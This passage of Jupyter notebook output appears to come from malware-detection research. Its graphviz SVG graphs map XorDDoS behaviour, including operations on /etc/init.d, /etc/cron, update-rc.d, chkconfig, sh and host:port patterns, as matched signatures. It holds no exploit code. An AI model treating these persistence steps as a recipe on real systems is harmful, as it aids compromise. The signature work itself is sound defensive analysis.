2518.06,-42.14 2523.87,-46.04\"/>\n<text text-anchor=\"middle\" x=\"2534.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2654.46\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2654.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.91C1489.64,-89.91 1500.87,-88.13 1511.46,-87 1627.49,-74.64 2448.56,-98.46 2561.46,-69 2583.97,-63.13 2607.01,-50.79 2624.53,-39.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2626.64,-42.65 2633.15,-34.29 2622.85,-36.76 2626.64,-42.65\"/>\n<text text-anchor=\"middle\" x=\"2629.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.execute</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.89C1489.64,-89.9 1500.87,-88.12 1511.46,-87 1543.29,-83.63 2641.01,-91.81 2663.46,-69 2669.51,-62.86 2669.63,-54.11 2667.46,-45.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2670.7,-44.31 2664.09,-36.02 2664.09,-46.62 2670.7,-44.31\"/>\n<text text-anchor=\"middle\" x=\"2695.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.assign</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2803.46\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2803.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.89C1489.64,-89.89 1500.87,-88.12 1511.46,-87 1578.54,-79.93 2660.87,-88.45 2725.46,-69 2743.83,-63.47 2762.01,-52.24 2776.19,-41.83\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2778.65,-44.35 2784.47,-35.5 2774.4,-38.79 2778.65,-44.35\"/>\n<text text-anchor=\"middle\" x=\"2794.96\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.download</text>\n</g>\n<!-- Start&#45;&gt;13 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;13</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.88C1489.63,-89.88 1500.87,-88.11 1511.46,-87 1548.04,-83.17 2809.63,-95.18 2835.46,-69 2842.96,-61.4 2839.15,-51.75 2831.94,-42.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2834.35,-40.42 2824.95,-35.54 2829.26,-45.22 2834.35,-40.42\"/>\n<text text-anchor=\"middle\" x=\"2862.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2926.46\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2926.46\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1478.91,-91.87C1489.63,-89.88 1500.87,-88.11 1511.46,-87 1549.54,-83.02 2855.39,-86.45 2889.46,-69 2899.8,-63.7 2907.99,-54.02 2914,-44.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2917.13,-46.17 2919.1,-35.76 2911.07,-42.66 2917.13,-46.17\"/>\n<text text-anchor=\"middle\" x=\"2925.46\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.find</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1570.46\" cy=\"-105\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1570.46\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">mem_addr</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1691.46\" cy=\"-105\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1691.46\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1795.46\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1795.46\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffee97e0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"911pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 910.56 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 906.56,-127 906.56,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"357.06\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"357.06\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"29.06\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"29.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M280.94,-101.78C182.73,-98.12 22.28,-89.11 4.06,-69 -3.19,-60.99 0.6,-50.48 7.19,-41.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"9.93,-43.36 13.51,-33.39 4.49,-38.95 9.93,-43.36\"/>\n<text text-anchor=\"middle\" x=\"27.06\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M279.76,-103.38C226.92,-100.62 156.2,-92.27 98.06,-69 81.05,-62.19 64.35,-50.27 51.64,-39.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"53.77,-36.99 43.9,-33.15 49.22,-42.31 53.77,-36.99\"/>\n<text text-anchor=\"middle\" x=\"123.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"146.06\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"146.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M284.59,-98.55C237.34,-93.6 181.19,-84.6 163.06,-69 156.34,-63.22 152.28,-54.67 149.81,-46.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"153.17,-45.27 147.54,-36.3 146.35,-46.82 153.17,-45.27\"/>\n<text text-anchor=\"middle\" x=\"185.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"272.06\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"272.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M290.87,-95.63C258.66,-90.06 224.81,-81.44 215.06,-69 205.13,-56.32 217.71,-44.34 233.55,-35.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"235.33,-38.31 242.57,-30.57 232.08,-32.11 235.33,-38.31\"/>\n<text text-anchor=\"middle\" x=\"238.06\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M326.93,-88.32C318.28,-82.93 309.25,-76.38 302.06,-69 295.29,-62.05 289.38,-53.28 284.64,-45.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"287.63,-43.22 279.8,-36.09 281.47,-46.55 287.63,-43.22\"/>\n<text text-anchor=\"middle\" x=\"327.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"367.06\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"367.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M356.43,-86.8C356.32,-77.12 356.58,-64.84 358.06,-54 358.43,-51.3 358.94,-48.5 359.52,-45.72\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"362.94,-46.47 361.87,-35.93 356.13,-44.84 362.94,-46.47\"/>\n<text text-anchor=\"middle\" x=\"383.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M390.39,-88.57C397.86,-83.46 404.82,-76.97 409.06,-69 415.45,-57 406.64,-45.27 395.47,-36.2\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"397.24,-33.16 387.1,-30.09 393.11,-38.81 397.24,-33.16\"/>\n<text text-anchor=\"middle\" x=\"433.06\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"477.06\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"477.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M415.59,-93.17C430.93,-87.98 446.41,-80.31 458.06,-69 464.41,-62.84 468.66,-54.34 471.5,-46.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"474.91,-46.92 474.31,-36.34 468.18,-44.98 474.91,-46.92\"/>\n<text text-anchor=\"middle\" x=\"493.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"570.06\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"570.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M429.48,-98.39C459.88,-93.65 494.69,-84.95 523.06,-69 534.31,-62.68 544.45,-52.76 552.41,-43.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"555.27,-45.45 558.81,-35.46 549.82,-41.06 555.27,-45.45\"/>\n<text text-anchor=\"middle\" x=\"565.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"686.06\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"686.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M430.8,-99.49C477.87,-95.05 539.66,-86.27 592.06,-69 613.74,-61.86 636.37,-49.97 654,-39.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"655.97,-42.48 662.73,-34.32 652.36,-36.48 655.97,-42.48\"/>\n<text text-anchor=\"middle\" x=\"658.56\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"831.06\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"831.06\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M433.23,-101.44C502.11,-97.86 605.94,-89.33 694.06,-69 726.36,-61.55 761.46,-48.64 788.04,-37.81\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"789.52,-40.98 797.43,-33.92 786.85,-34.51 789.52,-40.98\"/>\n<text text-anchor=\"middle\" x=\"766.06\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x263ffeeb1f0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Ms.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"1364pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 1364.04 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 1360.04,-127 1360.04,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"678.8\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"678.8\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"46.8\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"46.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M601.43,-104.57C444.9,-105.01 101.99,-102.12 60.8,-69 53.9,-63.46 50.24,-54.82 48.34,-46.27\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"51.76,-45.47 46.8,-36.11 44.84,-46.52 51.76,-45.47\"/>\n<text text-anchor=\"middle\" x=\"83.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.open</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"253.8\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"253.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M602.5,-101.98C452.69,-97.65 133.17,-86.42 116.8,-69 85.64,-35.84 165.74,-24.6 216.25,-20.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"216.79,-24.31 226.53,-20.15 216.32,-17.33 216.79,-24.31\"/>\n<text text-anchor=\"middle\" x=\"139.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M601.37,-104.16C469.65,-103.62 213.47,-98.71 185.8,-69 171.05,-53.17 195.93,-38.97 219.64,-29.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"221.07,-32.99 229.27,-26.28 218.67,-26.41 221.07,-32.99\"/>\n<text text-anchor=\"middle\" x=\"208.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M601.62,-103.11C485.79,-100.97 278,-93.69 254.8,-69 249.11,-62.95 247.53,-54.44 247.79,-46.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"251.29,-46.31 248.92,-35.99 244.34,-45.54 251.29,-46.31\"/>\n<text text-anchor=\"middle\" x=\"280.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M603.38,-100.73C515.97,-96.19 377.66,-86.5 328.8,-69 327.4,-68.5 301.5,-51.16 280.52,-37.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"282.46,-34.12 272.21,-31.43 278.55,-39.92 282.46,-34.12\"/>\n<text text-anchor=\"middle\" x=\"365.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M611.59,-96.06C566.4,-90.12 505.65,-80.96 452.8,-69 430.17,-63.88 425.21,-59.99 402.8,-54 364.33,-43.72 319.85,-33.49 289.57,-26.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"290.01,-23.28 279.49,-24.54 288.5,-30.11 290.01,-23.28\"/>\n<text text-anchor=\"middle\" x=\"471.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"456.8\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"456.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M610.18,-96.64C580.39,-91.59 545.76,-83.13 516.8,-69 503.39,-62.46 490.43,-52.32 480.01,-42.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"482.24,-40.16 472.57,-35.85 477.44,-45.26 482.24,-40.16\"/>\n<text text-anchor=\"middle\" x=\"543.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"588.8\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"588.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M615.36,-94.62C601.08,-89.41 587.58,-81.38 578.8,-69 573.92,-62.12 574.05,-53.44 576.15,-45.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"579.51,-46.25 579.47,-35.65 572.89,-43.96 579.51,-46.25\"/>\n<text text-anchor=\"middle\" x=\"601.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"727.8\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"727.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M648.74,-88.37C634.8,-78.99 623.05,-66.49 631.8,-54 644.01,-36.55 665.88,-27.77 685.67,-23.36\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"686.6,-26.75 695.77,-21.44 685.29,-19.87 686.6,-26.75\"/>\n<text text-anchor=\"middle\" x=\"668.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M693.12,-87.14C697.49,-81.57 702.11,-75.2 705.8,-69 710.22,-61.55 714.29,-53.04 717.7,-45.18\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"721.03,-46.29 721.63,-35.71 714.56,-43.6 721.03,-46.29\"/>\n<text text-anchor=\"middle\" x=\"741.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M739.24,-93.53C752.38,-88.34 764.75,-80.58 772.8,-69 780.83,-57.43 771.31,-45.67 758.99,-36.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"760.89,-33.52 750.65,-30.81 756.96,-39.31 760.89,-33.52\"/>\n<text text-anchor=\"middle\" x=\"803.3\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"950.8\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"950.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M738.02,-93.42C767.46,-87.48 803.38,-79.2 834.8,-69 864.73,-59.28 897.55,-44.75 920.62,-33.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"922.36,-36.9 929.87,-29.43 919.34,-30.58 922.36,-36.9\"/>\n<text text-anchor=\"middle\" x=\"896.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M753.91,-100.45C815.25,-96.26 896.02,-87.37 922.8,-69 931.11,-63.3 937.23,-54.27 941.59,-45.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"944.87,-46.69 945.65,-36.12 938.45,-43.9 944.87,-46.69\"/>\n<text text-anchor=\"middle\" x=\"959.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M754.18,-100.6C840.35,-95.93 971.54,-86.09 986.8,-69 995.45,-59.3 987.78,-47.55 977.33,-37.87\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"979.34,-34.99 969.43,-31.25 974.85,-40.36 979.34,-34.99\"/>\n<text text-anchor=\"middle\" x=\"1013.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1157.8\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1157.8\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M755.89,-103.36C829.99,-101.17 944.6,-93.58 1040.8,-69 1069.64,-61.63 1100.53,-48.17 1123.33,-37.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1125.17,-40.06 1132.57,-32.48 1122.06,-33.79 1125.17,-40.06\"/>\n<text text-anchor=\"middle\" x=\"1107.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M755.64,-102.31C877.51,-99.01 1104.49,-90.09 1134.8,-69 1142.66,-63.53 1147.89,-54.67 1151.35,-45.92\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1154.72,-46.87 1154.54,-36.27 1148.07,-44.67 1154.72,-46.87\"/>\n<text text-anchor=\"middle\" x=\"1170.8\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" 